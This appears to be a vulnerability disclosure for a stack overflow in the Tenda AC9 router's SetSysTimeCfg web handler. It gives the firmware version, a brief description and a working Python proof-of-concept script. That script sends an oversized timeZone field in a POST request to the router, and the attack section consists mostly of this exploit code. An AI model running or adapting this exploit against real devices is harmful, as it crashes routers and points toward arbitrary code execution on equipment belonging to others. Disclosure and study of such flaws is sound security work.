# Tenda_AC9_Settime_stack_overflow

Vender ：Tenda

Firmware version:US_AC9V3.0RTL_V15.03.06.42_multi_TD01.bin

Exploit Author: [doudoudedi233@gmail.com](mailto:doudoudedi233@gmail.com)

Vendor Homepage: https://www.tenda.com.cn/default.html

Hardware Link: https://www.tenda.com.cn/download/detail-2908.html



#### Describe

​	In Tenda AC9 ,firemware is US_AC9V3.0RTL_V15.03.06.42_multi_TD01.bin，When setting the system time / goform / setsystimecfg, the data length of the post request is not limited, resulting in stack overflow. Overwriting the return address will lead to arbitrary code execution.

#### Detail

​	fromSetSysTime function in IDA

<img src="./img/image-20210917162121669.png" alt="image-20210917162121669" style="zoom:50%;" />

 	Therefore, if you do not enter a semicolon and replace it with a long string, it will cause stack overflow 

<img src="./img/image-20210917162353124.png" alt="image-20210917162353124" style="zoom:50%;" />

If it is filled randomly, the service will be denied 

POC

```
import requests
from pwn import *

url = "http://192.168.0.1/goform/SetSysTimeCfg"


payload = "a"*0x200

f=open("payload","w")
f.write(payload)
f.close()
f1=open("payload")
payload=payload+f1.read()
print payload
'''
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}
'''
data={
	#"list":"192.168.33.0,255.255.255.0,192.168.33.1,WAN1"+payload
	"timePeriod":"",
	"ntpServer":"",
	"timeZone":"a"*0x400
}
headers={
	"Host":"192.168.0.1",
	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
	"Accept":"*/*",
	"Accept-Language":"en-US,en;q=0.5",
	"Accept-Encoding":"gzip, deflate",
	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With":"XMLHttpRequest",
	"Origin":"http://192.168.0.1",
	"Referer":"http://192.168.0.1/system_time.html?random=0.08358353685483821&",
	"Upgrade-Insecure-Requests":"1",
	"Cookie":"password=wnucvb"
}

response = requests.request("POST", url, headers=headers, data=data)
```

